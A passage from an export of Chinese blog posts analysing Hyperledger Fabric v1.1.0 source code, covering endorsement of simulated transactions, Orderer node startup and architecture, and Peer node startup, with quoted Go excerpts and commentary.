cds.ChaincodeSpec.ChaincodeId.Version, txid, false, signedProp, prop, cds)\n\t\tif err != nil {\n\t\t\treturn nil, nil, err\n\t\t}\n启动的真正过程正是在e.s.Execute中完成的,分析如下：\n\n/core/chaincode/exectransaction.go/Execute()\n\nfunc Execute(ctxt context.Context, cccid *ccprovider.CCContext, spec interface{}) (*pb.Response, *pb.ChaincodeEvent, error) {\n\t...\n\t// === 设置初始链码消息对象\n\t// 部署（实例化）deploy命令或升级upgrade命令：调用链码Init()接口方法\n\tcctyp := pb.ChaincodeMessage_INIT\n\t//// 检查链码规范对象类型为ChaincodeDeploymentSpec或ChaincodeInvocationSpec\n\tif cds, _ = spec.(*pb.ChaincodeDeploymentSpec); cds == nil {\n\t\tif ci, _ = spec.(*pb.ChaincodeInvocationSpec); ci == nil {\n\t\t\tpanic(&quot;Execute should be called with deployment or invocation spec&quot;)\n\t\t}\n\t\t// 调用invoke或查询query命令等：调用链码Invoke()接口方法\n\t\tcctyp = pb.ChaincodeMessage_TRANSACTION\n\t}\n \n\t// === 启动链码容器，返回链码输入参数等\n\t// created-&gt;established-&gt;ready状态\n\t_, cMsg, err := theChaincodeSupport.Launch(ctxt, cccid, spec)\n\t...\n\t// === 模拟执行交易链码并等待完成，监听并返回resp响应结果消息\n\tresp, err := theChaincodeSupport.Execute(ctxt, cccid, ccMsg, theChaincodeSupport.executetimeout)\n\t...\n\t// === 处理模拟执行结果\n\tif resp.ChaincodeEvent != nil {\n\t\t....\n\t}\n\t\t....\n}\n启动的动作在下面这个方法中完成：\n, cMsg, err := theChaincodeSupport.Launch(ctxt, cccid, spec)\n此方法的核心又是：launchAndWaitForRegister()，负责具体的链码容器工作,代码位置：/core/chaincode/chaincode_support.go/launchAndWaitForRegister\nfunc (chaincodeSupport *ChaincodeSupport) launchAndWaitForRegister(ctxt context.Context, cccid *ccprovider.CCContext, cds *pb.ChaincodeDeploymentSpec, launcher launcherIntf) error {\n\t...\n\t// 如果chaincodeMap字典中已经存在对应的链码规范名称，则说明已经启动链码容器，此时直接返回即可\n\tif _, hasBeenLaunched := chaincodeSupport.chaincodeHasBeenLaunched(canName); hasBeenLaunched {\n\t\t...\n\t}\n\t// 检查该链码容器是否已经正常运行，直接返回\n\tif chaincodeSupport.launchStarted(canName) {\n\t\t...\n\t}\n\t...\n\t\t// 核心方法：启动容器，实际调用的是ccLauncherImpl方法\n\t\tresp, err := launcher.launch(ctxt, notfy)\n\t...\n\t// === 阻塞等待处理响应消息，等待REGISTER链码消息\n\tselect {\n\tcase ok := &lt;-notfy:\n\t\t// Peer侧接收到链码容器侧发来的REGISTER注册链码消息，触发Handler的FSM运行，\n\t\t// 在回调方法beforeregister()中将外层Handler传递的notfy通道注册到Peer侧Handler中，\n\t\t// 根据链码注册成功结果，将结果消息放入notfy通道，触发此处的select语句。\n\t\t// 若notfy为flase，则说明注册失败。反之，则说明注册成功\n\t\t...\n}\n至此，chaincode.Execute()函数检查并启动了链码容器，执行完成链码请求操作.\n处理模拟执行结果\n处理模拟执行结果是由下面几段代码实现的：\n//=== 获取并处理交易模拟执行结果\n\tif txsim != nil {\n\t\tif simResult, err = txsim.GetTxSimulationResults(); err != nil {\n\t\t\treturn nil, nil, nil, nil, err\n\t\t}\n \n\t\tif simResult.PvtSimulationResults != nil { // 检查模拟结果隐私数据的合法性\n\t\t\tif cid.Name == &quot;lscc&quot; {\n\t\t\t\t// TODO: remove once we can store collection configuration outside of LSCC\n\t\t\t\treturn nil, nil, nil, nil, errors.New(&quot;Private data is forbidden to be used in instantiate&quot;)\n\t\t\t}\n\t\t\t// 分发隐私数据\n\t\t\tif err := e.distributePrivateData(chainID, txid, simResult.PvtSimulationResults); err != nil {\n\t\t\t\treturn nil, nil, nil, nil, err\n\t\t\t}\n\t\t}\n \n\t\tif pubSimResBytes, err = simResult.GetPubSimulationBytes(); err != nil {\n\t\t\treturn nil, nil, nil, nil, err\n\t\t}\n\t}\n两个关键函数：一个是GetTxSimulationResults，还有一个就是distributePrivateData。\nGetTxSimulationResults主要获取交易模拟执行结果的隐私数据读写集，然后遍历计算集合隐私数据的哈希值，然后获取交易模拟执行结果的公有数据读写集，最后构造交易模拟执行结果TxSimulationResults结构对象并返回。\ndistributePrivateData首先会获取指定通道上的隐私数据处理句柄，然后通过handler.distributor.Distribute分发隐私数据，\n最后通过coordinator模块将指定交易txID的隐私数据读写集privData暂时保存到本地transient隐私数据库中。Committer记账节点在提交区块数据与隐私数据之后，主动删除transient隐私数据库中关联的隐私数据，以及时清理过期数据。\n对模拟执行结果签名背书\nendorseProposal()方法对模拟执行结果进行签名背书，并返回提案响应消息。\nfunc (e *Endorser) endorseProposal(...) (*pb.ProposalResponse, error) {\n\t...\n\t// 调用ESCC系统链码进行背书\n\tres, _, err := e.callChaincode(ctx, chainID, version, txid, signedProp, proposal, ecccis, &amp;pb.ChaincodeID{Name: escc}, txsim)\n\t...\n}\ncallChaincode()方法调用ESCC系统链码的EndorserOneValidSignature.Invoke()方法，对模拟结果执行签名背书操作。代码如下：\n位置：/core/scc/escc/endorser_onevalidsignature.go/Invoke\nfunc (e *EndorserOneValidSignature) Invoke(stub shim.ChaincodeStubInterface) pb.Response {\n\targs := stub.GetArgs() // 获取参数列表\n\t// 检测参数个数\n\tif len(args) &lt; 6 {\n\t\treturn shim.Error(fmt.Sprintf(&quot;Incorrect number of arguments (expected a minimum of 5, provided %d)&quot;, len(args)))\n\t} else if len(args) &gt; 8 {\n\t\treturn shim.Error(fmt.Sprintf(&quot;Incorrect number of arguments (expected a maximum of 7, provided %d)&quot;, len(args)))\n\t}\n\t...\n\t// 获取执行链码响应消息\n\tresponse, err := putils.GetResponse(args[4])\n\t...\n\t// 获取模拟执行结果\n\tresults = args[5]\n \n\t/..\n\t// 获取本地MSP组件\n\tlocalMsp := mspmgmt.GetLocalMSP()\n\t...\n\t// 获取本地默认签名者身份实体（即背书成员）\n\tsigningEndorser, err := localMsp.GetDefaultSigningIdentity()\n\t...\n\t// 创建签名的提案响应消息\n\tpresp, err := utils.CreateProposalResponse(hdr, payl, response, results, events, ccid, visibility, signingEndorser)\n\t...\n\t// 序列化提案响应字节数组\n\tprBytes, err := utils.GetBytesProposalResponse(presp)\n\t...\n\t// 回复执行成功消息\n\treturn shim.Success(prBytes)\n}\n \n至此，Endorser背书节点处理签名提案消息的流程结束。\n参考\n\ngithub.com/blockchainGuide/\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_Order节点启动-2":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_Order节点启动-2","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger fabric源码_Order节点启动-2.md","title":"死磕hyperledger fabric源码_Order节点启动-2","links":[],"tags":[],"content":"\n死磕hyperledger fabric源码|Order节点启动\n文章及代码：github.com/blockchainGuide/\n分支：v1.1.0\n\n\nOrderer节点启动流程\n节点启动开始在/orderer/common/server/main.go:\nfunc Main() {\n\tfullCmd := kingpin.MustParse(app.Parse(os.Args[1:]))  // 解析用户命令行\n\t...\n\tconf, err := config.Load() //  加载orderer.yaml配置文件\n\t...\n\tinitializeLoggingLevel(conf) //初始化日志级别\n\tinitializeLocalMsp(conf) //初始化本地MSP组件\n \n\tprettyPrintStruct(conf) // 打印配置信息\n\tStart(fullCmd, conf) // 启动Orderer排序服务器\n}\n主要做了以下几件事：\n\n解析用户命令行\n加载orderer.yaml配置文件\n初始化日志级别\n初始化本地MSP组件\n打印配置信息\n启动Orderer排序服务器\n\n接下来将会展开的去讲上面比较重要的一些内容。\n加载orderer.yaml配置文件\n是由config.Load()开启的，进入到/orderer/common/localconfig/config.go/Load()\n①：初始化viper\n调用InitViper()函数设置配置文件路径，并默认在$FABRIC_CFG_PATH（如/etc/hyperledger/fabric）路径下查找配置文件，找不到文件时再依次查找当前目录、默认开发配置目录 （$GOPATH/src/github.com/hyperledger/fabric/sampleconfig）和系统默认配置路径 （/etc/hyperledger/fabric）。接着开启匹配系统环境变量的模式，即为Viper组件配置项（以.分割的格式）添加指定前缀“ORDERER_”，转换为大写字母形式，再将“.”替换为_。这样，Viper组件就能在查找配置项时，与以“ORDERER_”前缀开头的环境变量进行匹配，获取其在环境变量中的配置值。\nconfig := viper.New()\n\tcf.InitViper(config, configName)\n\tconfig.SetEnvPrefix(Prefix)\n\tconfig.AutomaticEnv()\n\treplacer := strings.NewReplacer(&quot;.&quot;, &quot;_&quot;)\n\tconfig.SetEnvKeyReplacer(replacer)\n②：加载Orderer.yaml配置文件\nerr := config.ReadInConfig()\n③：解析配置文件成Orderer配置对象\nvar uconf TopLevel\nerr = viperutil.EnhancedExactUnmarshal(config, &amp;uconf)\n此配置对象为TopLevel型，结构体如下：\ntype TopLevel struct {\n\tGeneral    General    //通用配置对象\n\tFileLedger FileLedger //文本账本配置对象\n\tRAMLedger  RAMLedger  //RAM账本配置对象\n\tKafka      Kafka      // Kafka共识组件配置对象\n\tDebug      Debug      // 调试信息配置对象\n}\n④：检查Orderer配置对象conf配置项并设置默认值\nuconf.completeInitialization(filepath.Dir(config.ConfigFileUsed()))\n初始化日志与本地MSP组件\n①：初始化日志\ninitializeLoggingLevel设置Orderer节点上的日志后端输出流、输出格 式与默认日志级别（INFO级别）。\nfunc initializeLoggingLevel(conf *config.TopLevel) {\n\tflogging.InitBackend(flogging.SetFormat(conf.General.LogFormat), os.Stderr)\n\tflogging.InitFromSpec(conf.General.LogLevel)\n}\n②：初始化本地MSP组件\n首先加载本地的MSP组件，根据MSP配置文件路径、BCCSP密码服务组件配置、MSP名称初始化本地MSP组件 。\nfunc initializeLocalMsp(conf *config.TopLevel) {\n\terr := mspmgmt.LoadLocalMsp(conf.General.LocalMSPDir, conf.General.BCCSP, conf.General.LocalMSPID)\n\t...\n}\n本地MSP组件默认使用bccspmsp类型对象。该类型的MSP组件是基于BCCSP组件提供密码套件服务的，封装了MSP组件（通常对应于一个组织）信任的相关证书列表（包含根CA证书、中间CA证书等）、MSP名称、签名者身份实体与管理员身份实体列表等。MSP组件的关键内容后面会有专门去讲解。\n启动Orderer排序节点\n启动函数在/orderer/common/server/main.go/Start()函数中，接下来一步步的解析：\n①：创建本地MSP签名者实体 signer\nsigner := localmsp.NewSigner()       \n②：初始化TLS认证的安全服务器配置项和gRPC服务器\n本地gRPC服务器grpcServer默认端口为7050\nserverConfig := initializeServerConfig(conf)       \ngrpcServer := initializeGrpcServer(conf, serverConfig) \n③：设置TLS连接认证的回调函数\ntlsCallback := func(bundle *channelconfig.Bundle) {\n\t\tif grpcServer.MutualTLSRequired() { // 检测是否需要认证TLS客户端证书\n\t\t\tlogger.Debug(&quot;Executing callback to update root CAs&quot;)\n\t\t\tupdateTrustedRoots(grpcServer, caSupport, bundle) //执行回调函数更新根CA证书\n\t\t}\n\t}\n④：创建多通道注册管理器\n多通道注册管理器Registrar对象，用于注册Orderer节点上的所有通道（包括系统通道和应用通道），负责维护通道配置、账本等重要资源。\n多通道注册管理器Registrar对象相当于Orderer节点上的“资源管理器”，为每个通道创建关联的共识组件链对象，负责交易排序、打包出块、提交账本以及通道管理等工作\nmanager := initializeMultichannelRegistrar(conf, signer, tlsCallback)\nfunc initializeMultichannelRegistrar(conf *config.TopLevel, signer crypto.LocalSigner,\n\tcallbacks ...func(bundle *channelconfig.Bundle)) *multichannel.Registrar {\n\tlf, _ := createLedgerFactory(conf) //创建通道的账本工厂对象\n\tif len(lf.ChainIDs()) == 0 {\n\t\tinitializeBootstrapChannel(conf, lf) //初始化系统通道\n\t} else {\n\t\tlogger.Info(&quot;Not bootstrapping because of existing chains&quot;)\n\t}\n \n\t//创建并设置共识组件字典\n\tconsenters := make(map[string]consensus.Consenter)\n\tconsenters[&quot;solo&quot;] = solo.New()\n\tconsenters[&quot;kafka&quot;] = kafka.New(conf.Kafka) //// Kafka类型共识组件\n\treturn multichannel.NewRegistrar(lf, consenters, signer, callbacks...)\n}\n4.1 创建通道的账本工厂对象\n代码路径/orderer/common/server/util.go，大概做了以下几件事：\n\n获取Orderer节点上的区块账本存储目录ld，包括默认目录/var/hyperledger/production/orderer或临时目录中的子目录hyperledger-fabric-ordererledger+随机数后缀（默认目录不存在时使用）\n创建基于文件的区块账本工厂对象lf（fileLedgerFactory类型）\n在区块账本目录下建立以chains命名的子目录（/var/hyperledger/production/orderer/chains），由每个通道账本的区块数据存储对象负责在chains子目录下创建维护以通道ID（即链ID）命名的通道账本子目录，用于保存该通道账本的所有区块数据文件。其中，区块数据文件名都是以blockfile_num命名，num是6位区块文件编号，左侧不足位数用0补齐。\n\n4.2 初始化系统通道\nfunc initializeBootstrapChannel(conf *config.TopLevel, lf blockledger.Factory) {\n\t...\n\tswitch conf.General.GenesisMethod { // 分析创世区块的生成方式\n\tcase &quot;provisional&quot;: // 根据配置文件生成创世区块\n\t\tgenesisBlock = encoder.New(genesisconfig.Load(conf.General.GenesisProfile)).GenesisBlockForChannel(conf.General.SystemChannel)\n\tcase &quot;file&quot;: // 根据创世区块文件生成创世区块\n\t\tgenesisBlock = file.New(conf.General.GenesisFile).GenesisBlock()\n\tdefault:\n\t}\n \n\tchainID, err := utils.GetChainIDFromBlock(genesisBlock) // 从创世区块中解析获取通道ID\n\t...\n\tgl, err := lf.GetOrCreate(chainID) // 创建系统通道的区块账本对象\n\t...\n\terr = gl.Append(genesisBlock) // 添加区块到系统通道账本上\n\t...\n}\n⑤：创建Orderer排序服务器\nOrderer排序服务器，提供Orderer服务与管理所有通道资源及其账本、共识组件等。\nserver := NewServer(manager, signer, &amp;conf.Debug, conf.General.Authentication.TimeWindow, mutualTLS)\nfunc NewServer(r *multichannel.Registrar, _ crypto.LocalSigner, debug *localconfig.Debug, timeWindow time.Duration, mutualTLS bool) ab.AtomicBroadcastServer {\n\ts := &amp;server{\n\t\tdh:        deliver.NewHandlerImpl(deliverSupport{Registrar: r}, timeWindow, mutualTLS),\n\t\tbh:        broadcast.NewHandlerImpl(broadcastSupport{Registrar: r}),\n\t\tdebug:     debug,\n\t\tRegistrar: r,\n\t}\n\treturn s\n}\n\n\nbh：Broadcast服务处理句柄（deliverHandler类型）。该对象实现了Broadcast交易广播服务的Handle(srv ab.AtomicBroadcast_BroadcastServer)消息处理接口，负责接收客户端提交的普通交易消息与配置交易消息，并分别进行处理，过滤后转发给通道绑定的共识组件链对象进行处理；\n\n\ndh：Deliver服务处理句柄（handlerImpl类型）。该对象实现了Deliver区块分发服务的Handle(srv*DeliverServer)消息处理接口，负责接收客户端提交的区块请求消息，从Orderer节点区块账本中读取指定的区块数据，并返回给请求节点。如果请求的指定区块还没有生成，则默认阻塞等待直到该区块创建和提交完毕；\n\n\nRegistrar：Orderer节点的多通道注册管理器（Registrar类型）。该对象封装了Orderer节点上所有通道的链支持对象字典chains、共识组件字典consenters、区块账本工厂对象ledgerFactory、系统通道链支持对象与ID、本地签名者实体signer等，用于管理通道配置、区块账本对象、共识组件等核心资源，相当于Orderer节点上的“资源管理器”。\n\n\n⑥：解析执行子命令\n\nstart子命令：启动profile服务与Orderer排序服务器，支持go tool pprof命令查看与分析程序性能瓶颈\nbenchmark子命令：用于启动测试服务器\n\nswitch cmd { //分析命令类型\n\tcase start.FullCommand(): // &quot;start&quot; command // start启动子命令\n\t\tlogger.Infof(&quot;Starting %s&quot;, metadata.GetVersionInfo())\n\t\tinitializeProfilingService(conf) // goroutine启动go profile服务\n\t\tab.RegisterAtomicBroadcastServer(grpcServer.Server(), server)\n\t\tlogger.Info(&quot;Beginning to serve requests&quot;)\n\t\tgrpcServer.Start() // 启动gRPC服务器提供Orderer服务\n\tcase benchmark.FullCommand(): // &quot;benchmark&quot; command // &quot;benchmark&quot; 测试用例子命令\n\t\tlogger.Info(&quot;Starting orderer in benchmark mode&quot;)\n\t\tbenchmarkServer := performance.GetBenchmarkServer()\n\t\tbenchmarkServer.RegisterService(server)\n\t\tbenchmarkServer.Start()\n\t}\n\n参考\n\ngithub.com/blockchainGuide/\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_Order节点概述-1":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_Order节点概述-1","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger fabric源码_Order节点概述-1.md","title":"死磕hyperledger fabric源码_Order节点概述-1","links":[],"tags":[],"content":"\n死磕hyperledger fabric源码|Order节点概述\n文章及代码：github.com/blockchainGuide/\n分支：v1.1.0\n\n\n前言及源码目录\nOrderer排序节点这块内容主要包括了节点启动流程、Broadcast广播交易服务、Orderer共识排序服务以及Deliver区块分发服务。其相关源码目录文件如下：\n\n/orderer\n|-common\n​\t|-blockcutter:交易切割打包模块  ✨✨✨✨✨✨\n​\t|-bootstrap:引导启动模块，生成创世块  ✨✨✨✨✨✨\n​\t|-broadcast:交易广播服务模块 ✨✨✨✨✨✨\n​\t|-localconfig:本地配置模块\n​\t|-metadata：获取元数据模块\n​\t|-msgprocessor:消息处理器模块\n​\t|-multichannel：多管道注册管理器模块\n​\t|-performance：性能测量模块\n​\t|-server：Order排序服务器模块  ✨✨✨✨✨✨\n|-consensus\n​\t|-kafka:kafka共识组件模块 ✨✨✨✨✨✨\n​\t|-solo:solo共识组件模块\n​\t|-consensus.go:定义共识组件相关接口\n|-main.go:orderer主程序\n\n\n/common\n|-deliver:定义Deliver服务器及处理器接口 ✨✨✨✨✨✨\n\n\n/core\n|-deliverservice\n​\t|-blocksprovider:区块提供者模块 ✨✨✨✨✨✨\n​\t|-client.go:提供broadcastClient客户端 ✨✨✨✨✨✨\n​\t|-deliveryClient：Deliver服务客户端 ✨✨✨✨✨✨\n​\t|-requester.go:请求区块数据 ✨✨✨✨✨✨\n\n\n/protos\n|-orderer:protobuf消息定义模块\n\n主要功能\nOrderer排序节点在Hyperledger Fabric系统架构中处于核心角色地位，管理着系统通道与所有应用通道，负责通道创建、通道配置更新等操作，并处理客户端提交的交易消息请求，对交易进行排序并按规则打包成新区块，提交账本并维护通道账本数据，为全网节点提供Broadcast交易广播服务、Orderer共识排序服务、Deliver区块分发服务等。通常，Hyperledger Fabric启动时需要先启动Orderer排序节点，创建系统通道提供正常服务后，再启动其他角色的Peer节点进入正常工作状态。其服务模块关系与架构示如图：\n\nOrderer节点启动后基于创世区块初始化系统通道，创建Orderer排序服务器，封装了Broadcast服务处理句柄、Deliver服务处理句柄与多通道注册管理器对象，并提供Broadcast()交易广播服务接口与 Deliver()区块分发服务接口。\n其中，Orderer排序服务器基于Broadcast()接口接收交易广播服务请求，调用Broadcast服务处理句柄的Handle()方法进行处理，建立消息处理循环，接收与处理客户端提交的普通交易消息、配置交易消息等请求消息，经过滤后发送至通道绑定的共识组件链对象（Solo类型、Kafka类型等）进行排序。接着，再将排序后的交易添加到本地待处理的缓存交易消息列表，并按照交易出块规则构造新区块，提交到Orderer节点指定通道账本的区块数据文件中，同时负责创建新的应用通道、更新通道配置等通道管理工作。目前，Orderer排序服务器负责接收与处理两类交易消息，具体如下。\n\n\n配置交易消息（ConfigMsg）：通道头部类型是CONFIG_UPDATE的通道配置交易消息，含有最新的通道配置信息，经过通道消息处理器过滤后，转换为通道头部类型为 ORDERER_TRANSACTION或CONFIG的配置交易消息（Envelope类型），分别用于创建新的应用通道或更新通道配置，同时，将通道配置交易消息单独打包成新区块，并提交到系统通道账本与应用通道账本。\n\n\n普通交易消息（NormalMsg）：通道头部类型是ENDORSER_TRANSACTION等的标准交易消息（经过Endorser背书的交易消息或其他非配置交易消息），含有改变世界状态的模拟执行结果读写集，经过Endorser节点签名背书后打包发送到Orderer节点请求处\n理，经过通道消息处理器过滤后，将合法交易提交到共识组件链对象进行排序，再按照交易出块规则（出块时间周期、打包最大交易数量、区块字节数限制等）生成新区块，并提交到通道账本。\n\n\n同时，Orderer排序服务器提供Deliver()区块分发服务接口，将接收的服务请求交由Deliver服务处理句柄的Handle()方法处理，建立消息处理循环，负责接收与处理客户端提交的区块请求消息，封装了指定区块请求范围的区块搜索信息（SeekInfo类型）。接着，Deliver服务处理句柄循环从本地账本获取区块数据，依次发送给请求节点（如Leader主节点）。如果账本中还未生成指定区块，则Deliver服务处理句柄默认一直阻塞等待，直到该区块创建完成并提交账本后再回复给请求节点。\n另外，Orderer排序服务器还提供了多通道注册管理器Registrar对象，负责管理系统通道与所有应用通道，封装了所有通道的链支持对象字典、共识组件字典、区块账本工厂对象等组件，维护所有通道上的通道配置、区块账本对象、共识组件等核心资源，创建通道上的共识组件链对象提供Orderer共识排序服务，负责对交易消息排序，切割打包构造新区块并提交账本，同时负责创建新的应用通道与更新通道配置，其相当于Orderer节点上的“资源管理器”。\n实际上，Orderer排序服务器上的通道共识组件链对象利用Golang通道（Solo共识组件）或Kafka集群（Kafka共识组件）作为共识排序后端，对经过通道消息处理器过滤的合法交易消息进行排序，对交易顺序等达成一致性观点。同时，在新通道创建时或启动恢复现有通道时，启动通道绑定的链支持对象以及共识组件链对象，构建交易消息处理循环，接收共识组件已经完成排序的交易消息，并添加到本地待处理的缓存交易消息列表中，包括配置交易消息、普通交易消息等，采用相互独立的消息处理流程分别处理 。\n注意，目前Orderer节点账本只包括区块数据文件与区块索引数据库，负责保存区块数据即公有数据（包含公共数据与隐私数据哈希值），不存在状态数据库、历史数据库、隐私数据库等。不同于Peer节点，Orderer节点在提交区块到本地账本前不需要验证交易背书策略与执行MVCC检查，也不保存任何隐私数据（明文），只负责存储所有通道账本上的区块数据。\n参考\n\ngithub.com/blockchainGuide/\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_Peer节点启动-6":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_Peer节点启动-6","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger fabric源码_Peer节点启动-6.md","title":"死磕hyperledger fabric源码_Peer节点启动-6","links":[],"tags":[],"content":"\n死磕hyperledger fabric源码|Peer节点启动\n文章及代码：github.com/blockchainGuide/\n分支：v1.1.0\n\n\n启动流程概述\n入口：peer/main.go:\nmain()函数负责初始化peer主命令对象，注册子命令与初始化环境配置，解析用户输入子命令start并启动Peer节点，包括如下流程步骤：\n\n定义、注册命令与初始化基本配置。基于Cobra组件定义peer主命令对象mainCmd，并通过Viper组件调用InitConfig()函数，从本地core.yaml配置文件、环境变量、命令行选项等读取与解析peer命令的相关配置。同时，初始化主命令mainCmd的标志位选项 version、logging-level等，然后在主命令mainCmd上注册version、node、chaincode、channel等子命令，设置最大可用CPU核数与日志后端；\n初始化本地MSP组件。通过Viper组件获取MSP组件的配置文件路径mspMgrConfigDir、BCCSP配置项bccspConfig、MSP名称ID即localMSPID、MSP组件类型localMSPType等，基于这4个参数构造本地MSP配置对象，接着创建默认的bccspmsp结构对象作为本地MSP组件，并解析MSP配置对象与初始化本地MSP组件；\n执行mainCmd.Execute()方法启动Peer节点\n\n接下来将会分别对这几个关键部分进行细说。\n定义、注册命令与初始化基本配置\n定义主命令\n代码分析 如下：\nvar mainCmd = &amp;cobra.Command{ // 基于Cobra组件构造主命令\n\tUse: &quot;peer&quot;, // 定义命令使用方法\n\t//// 定义执行函数\n\tPersistentPreRunE: func(cmd *cobra.Command, args []string) error {\n\t\t//检查CORE_LOGGING_LEVEL环境变量，覆盖所有其他日志设置值。否则，使用core.yaml文件中的配置值\n\t\tvar loggingSpec string\n\t\tif viper.GetString(&quot;logging_level&quot;) != &quot;&quot; {\n\t\t\tloggingSpec = viper.GetString(&quot;logging_level&quot;) // 获取配置文件中的日志级别\n\t\t} else {\n\t\t\tloggingSpec = viper.GetString(&quot;logging.level&quot;) // 获取配置文件中的日志级别\n\t\t}\n\t\tflogging.InitFromSpec(loggingSpec) // 根据配置的日志级别初始化日志记录器\n\t\treturn nil\n\t},\n\tRun: func(cmd *cobra.Command, args []string) { // 定义执行函数\n\t\tif versionFlag {\n\t\t\tfmt.Print(version.GetInfo()) // 打印peer程序版本信息\n\t\t} else {\n\t\t\tcmd.HelpFunc()(cmd, args) // 直接打印命令帮助信息\n\t\t}\n\t},\n注册子命令\n将几类子命令注册到主命令上，种类如下：\n\nchannel通道子命令：用于创建应用通道、获取区块、Peer节点加入应用通道、获取节点所加入的应用通道列表、更新应用通道配置、签名配置交易文件、获取指定的应用通道信息等，包括create、fetch、join、list、update、signconfigtx、getinfo等子命令；\nchaincode链码子命令：用于安装链码、实例化（部署）链码、调用链码、打包链码、查询链码、签名链码包、升级链码、获取通道链码列表等，包括install、instantiate、invoke、package、query、signpackage、upgrade、list等子命令；\nnode节点子命令：用于管理节点服务进程与查询服务状态，包括start、status等子命令；\nlogging日志子命令：用于获取、设置与恢复日志级别功能，包括getlevel、setlevel、 revertlevels等子命令；\nversion版本子命令：用于打印Fabric中的Peer节点服务器版本信息。\n\nviper.SetEnvPrefix(cmdRoot)               // 设置环境变量前缀core\n\tviper.AutomaticEnv()                      // 查找匹配环境变量\n\treplacer := strings.NewReplacer(&quot;.&quot;, &quot;_&quot;) // 创建替换符\n\tviper.SetEnvKeyReplacer(replacer)         // 设置环境变量替换符\n\t// 定义命令行选项集合，对所有peer及其子命令都有效\n\tmainFlags := mainCmd.PersistentFlags()\n\t// 设置绑定version与logging-level选项\n\tmainFlags.BoolVarP(&amp;versionFlag, &quot;version&quot;, &quot;v&quot;, false, &quot;Display current version of fabric peer server&quot;)\n\tmainFlags.String(&quot;logging-level&quot;, &quot;&quot;, &quot;Default logging level and overrides, see core.yaml for full syntax&quot;)\n\t// Viper配置绑定命令行选项\n\tviper.BindPFlag(&quot;logging_level&quot;, mainFlags.Lookup(&quot;logging-level&quot;))\n\t// 注册子命令\n\tmainCmd.AddCommand(version.Cmd())       // version子命令\n\tmainCmd.AddCommand(node.Cmd())          // node子命令start、status\n\tmainCmd.AddCommand(chaincode.Cmd(nil))  // chaincode子命令install等\n\tmainCmd.AddCommand(clilogging.Cmd(nil)) // cli日志子命令 getlevel\n\tmainCmd.AddCommand(channel.Cmd(nil))    // channel子命令 create等\n\t// 加载配置文件core.yaml\n\terr := common.InitConfig(cmdRoot)\n\t...\n\truntime.GOMAXPROCS(viper.GetInt(&quot;peer.gomaxprocs&quot;)) // 设置最大可用的CPU核数\n\t// setup system-wide logging backend based on settings from core.yaml\n\t// 初始化系统日志后端\n\tflogging.InitBackend(flogging.SetFormat(viper.GetString(&quot;logging.format&quot;)), logOutput)\n初始化本地MSP组件\nMSP组件是管理本地成员身份的重要安全模块，封装了根CA证书、本地签名者实体等.\n// 初始化本地MSP组件对象\n\tvar mspMgrConfigDir = config.GetPath(&quot;peer.mspConfigPath&quot;) // 获取MSP配置文件路径\n\tvar mspID = viper.GetString(&quot;peer.localMspId&quot;)             // 获取本地MSP名称\n\tvar mspType = viper.GetString(&quot;peer.localMspType&quot;)         // 获取本地MSP组件类型\n\tif mspType == &quot;&quot; {\n\t\t// 默认设置MSP组件类型为FABRIC类型\n\t\tmspType = msp.ProviderTypeToString(msp.FABRIC)\n\t}\n\t// 获取BCCSP组件配置信息，初始化MSP组件对象\n\terr = common.InitCrypto(mspMgrConfigDir, mspID, mspType)\n执行主命令\n函数如下：\nif mainCmd.Execute() != nil {}\n接下来进入到Execute()函数中继续分析： /vendor/github.com/spf13/cobra/command.go/ExecuteC()\nfunc (c *Command) ExecuteC() (cmd *Command, err error) {}\n通过Cobra组件调用主命令Execute()方法，执行peer node start命令启动Peer节点。其中，Cobra组件解析完用户输入的命令行选项之后，依次执行节点启动命令nodeStartCmd对象中定义的所有相关的执行方法，并按照cobra.Command命令中定义的如下顺序来执行\n\nPersistentPreRunE()/PersistentPreRun()；\nPreRunE()/PreRun()；\nRunE()/Run()；\nPostRunE()/PostRun()；\nPersistentPostRunE()/PersistentPostRun();\n\n到这里为止节点命令开启执行，因为这部分主要是讲的节点启动，所以下面集中将节点启动命令执行的运行流程。\n节点启动命令执行\n节点启动的命令可以根据以下代码路径查找：\nmainCmd.AddCommand(node.Cmd()) \nfunc Cmd() *cobra.Command {\n\tnodeCmd.AddCommand(startCmd())\n\tnodeCmd.AddCommand(statusCmd())\n\treturn nodeCmd\n}\n这里只讨论节点启动命令\nfunc startCmd() *cobra.Command {\n...\n\treturn nodeStartCmd\n}\nvar nodeStartCmd = &amp;cobra.Command{\n...\n\t\treturn serve(args)\n\t},\n}\n正式进入到serve函数讨论：\n初始化资源\n①：获取本地MSP组件类型并检查MSP组件类型\n目前，Hyperledger Fabric支持FABRIC类型和IDEMIX类型两种MSP组件，默认采用基于BCCSP组件构建的FABRIC类型MSP组件.\nmspType := mgmt.GetLocalMSP().GetType() // 获取本地MSP组件类型\n\tif mspType != msp.FABRIC {              // 检查MSP组件类型\n\t\tpanic(&quot;Unsupported msp type &quot; + msp.ProviderTypeToString(mspType))\n\t}\n②：初始化资源访问策略提供者\naclmgmt.RegisterACLProvider(nil)\n③：初始化本地账本管理器\nledgermgmt.Initialize(peer.ConfigTxProcessors) \t\n\ncore/ledger/ledgermgmt/ledger_mgmt.go/initialize\n\nfunc initialize(customTxProcessors customtx.Processors) {\n\tlogger.Info(&quot;Initializing ledger mgmt&quot;)\n\tlock.Lock()\n\tdefer lock.Unlock() // 设置Peer节点初始化标志位为true\n\tinitialized = true\n\t// 创建已打开的账本字典openedLedgers\n\topenedLedgers = make(map[string]ledger.PeerLedger)\n\t// 